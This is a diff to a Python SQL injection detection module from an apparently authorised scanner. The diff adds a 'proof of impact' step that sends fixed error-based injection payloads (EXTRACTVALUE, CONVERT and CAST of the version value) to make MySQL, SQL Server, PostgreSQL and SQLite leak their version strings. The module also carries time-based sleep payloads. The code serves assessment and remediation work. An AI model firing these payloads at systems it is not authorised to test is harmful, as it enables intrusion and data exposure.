@@ -10,6 +10,12 @@ Three detection styles, a fixed payload set, and a hard cap of
 3. **time** — one delayed query per engine family, measured once against the
    baseline.
 
+When one of those proves the point, the remaining budget is spent on **proof of
+impact**: fixed error-based casts that make the engine print its own version
+(``VERSION()``, ``@@VERSION``, ``sqlite_version()``) back in an error message.
+That turns "this looks injectable" into "this query reads data I did not ask
+for" without touching a single row.
+
 What this module deliberately cannot do, in any configuration:
 
 * it never builds a payload from anything except the parameter value the
@@ -17,22 +23,30 @@ What this module deliberately cannot do, in any configuration:
 * there is no flag, file, environment variable or config key that supplies a
   payload string;
 * it performs no set-operator extraction, no statement stacking, no file
-  primitives, no command primitives, and no schema enumeration;
+  primitives, no command primitives, no schema enumeration and no table reads;
+  the only value it ever extracts is the engine's own version string;
 * it loops at most ``MAX_REQUESTS`` times in total, including the baseline.
 
-Detection is enough to justify a remediation ticket. Reading the data is what
-turns an authorised assessment into an incident, so that is where this stops.
-Every finding states which style proved the point and how many requests were
-spent proving it.
+Proving the hole is the job. Dumping the database is what turns an authorised
+assessment into an incident, and a table dump is not needed to open a
+remediation ticket. Every finding states which style proved the point, what the
+proof extracted and how many requests were spent.
 """
 
 from __future__ import annotations
 
 import difflib
-import urllib.parse
+import re
 
 from ..models import Severity
-from .base import MissingInput, Module, ScanContext, finding
+from .base import (
+    MissingInput,
+    Module,
+    ScanContext,
+    finding,
+    query_param_value,
+    swap_query_param,
+)
 
 MAX_REQUESTS = 8
 TIME_DELAY_SECONDS = 2
@@ -61,7 +75,14 @@ ERROR_SIGNATURES = (
     ("sequelizedatabaseerror", "generic", "Sequelize database error"),
     ("sqlalchemy.exc", "generic", "SQLAlchemy exception"),
     ("jdbc", "generic", "JDBC driver error"),
+    ("xpath syntax error", "mysql", "MySQL XPath error"),
+    ("invalid input syntax for type", "postgres", "PostgreSQL cast error"),
+    ("conversion failed when converting", "mssql", "SQL Server conversion error"),
 )
+
+# Shared with every parameter technique: same point, same encoding rules.
+_swap_param = swap_query_param
+_original = query_param_value
 
 # One delayed query per plausible engine family. Both are read-only waits.
 TIME_PAYLOADS = (
@@ -69,32 +90,31 @@ TIME_PAYLOADS = (
     ("postgres", "';SELECT pg_sleep(2)-- -"),
 )
 
+# Error-based casts: the engine refuses the cast and prints the value it refused.
+# Fixed payloads, metadata only, one per engine family.
+PROOF_PAYLOADS = (
+    ("mysql", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))-- -"),
+    ("mssql", "' AND 1=CONVERT(int,@@VERSION)-- -"),
+    ("postgres", "' AND 1=CAST(VERSION() AS int)-- -"),
+    ("sqlite", "' AND 1=CAST(sqlite_version() AS int)-- -"),
+)
 
-def _swap_param(url: str, param: str, value: str) -> str:
-    """Replace exactly one query parameter, preserving every other one."""
-    parts = urllib.parse.urlsplit(url)
-    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
-    replaced = False
-    updated: list[tuple[str, str]] = []
-    for key, current in pairs:
-        if not replaced and key == param:
-            updated.append((key, value))
-            replaced = True
-        else:
-            updated.append((key, current))
-    if not replaced:
-        updated.append((param, value))
-    return urllib.parse.urlunsplit(
-        (parts.scheme, parts.netloc, parts.path, urllib.parse.urlencode(updated), parts.fragment)
-    )
+VERSION_WITH_ENGINE = re.compile(
+    r"(?i)\b(?:mariadb|mysql|postgresql|sqlite|microsoft sql server)\b"
+    r"[^\n]{0,80}?(\d+\.\d+(?:\.\d+)?)"
+)
+VERSION_QUOTED = re.compile(r"[~'\"](\d+\.\d+(?:\.\d+)?)[^'\"\n]{0,40}[\"']")
 
 
-def _original(url: str, param: str) -> str | None:
-    pairs = urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True)
-    for key, value in pairs:
-        if key == param:
-            return value
-    return None
+def _extract_version(text: str, baseline: str = "") -> str:
+    """A version token that was not already on the page. Never a table row."""
+    window = text[:BODY_WINDOW]
+    for pattern in (VERSION_WITH_ENGINE, VERSION_QUOTED):
+        for match in pattern.finditer(window):
+            token = match.group(1)
+            if token and token not in baseline:
+                return token
+    return ""
 
 
 def _ratio(left: str, right: str) -> float:
@@ -248,30 +268,66 @@ class SqlInjectionModule(Module):
                     )
                     break
 
+        # -- 4. proof of impact --------------------------------------------
+        # Detection says the query can be changed. This says it can READ:
+        # a failed type cast makes the engine print its own version back.
+        impact: dict[str, str] = {}
+        if styles:
+            for engine, payload in PROOF_PAYLOADS:
+                if sent >= MAX_REQUESTS:
+                    break
+                attempt = ctx.http_get_url(_swap_param(url, param, original + payload))
+                sent += 1
+                if attempt.error:
+                    continue
+                # No error-signature requirement here: the version token itself
+                # is the proof, and a cast error does not always say "SQL".
+                extracted = _extract_version(attempt.text, baseline_text)
+                if extracted:
+                    impact = {
+                        "engine": engine,
+                        "version": extracted,
+                        "method": "error-based cast",
+                    }
+                    dbms = dbms or engine
+                    break
+
         evidence.update(
             {
                 "injectable": bool(styles),
                 "styles": styles,
                 "dbms_hint": dbms,
                 "requests_sent": sent,
+                "proof_of_impact": impact,
             }
         )
 
         if styles:
             detail = (
-                f"Proved by {', '.join(styles)}: {proof}. No data was read or "
-                "extracted; this is a detection result, not a dump."
+                f"Proved by {', '.join(styles)}: {proof}."
             )
+            if impact:
+                detail += (
+                    f" Proof of impact: the {impact['engine']} error returned version "
+                    f"{impact['version']}, so this parameter reads data. No table rows "
+                    "were read, stored or returned."
+                )
+            else:
+                detail += (
+                    " The proof-of-impact cast did not return a version, so the "
+                    "injection is proven but the read is not demonstrated."
+                )
             return [
                 finding(
                     ctx,
                     self.attack_id,
-                    f"SQL injection in parameter {param}",
+                    f"SQL injection in parameter {param}"
+                    + (f" (reads {impact['engine']} data)" if impact else ""),
                     Severity.CRITICAL,
                     detail=detail,
                     evidence=evidence,
                     references=["CWE-89", "OWASP-A03:2021"],
-                    confidence="high" if "error" in styles else "medium",
+                    confidence="high" if (impact or "error" in styles) else "medium",
                 )
             ]
 
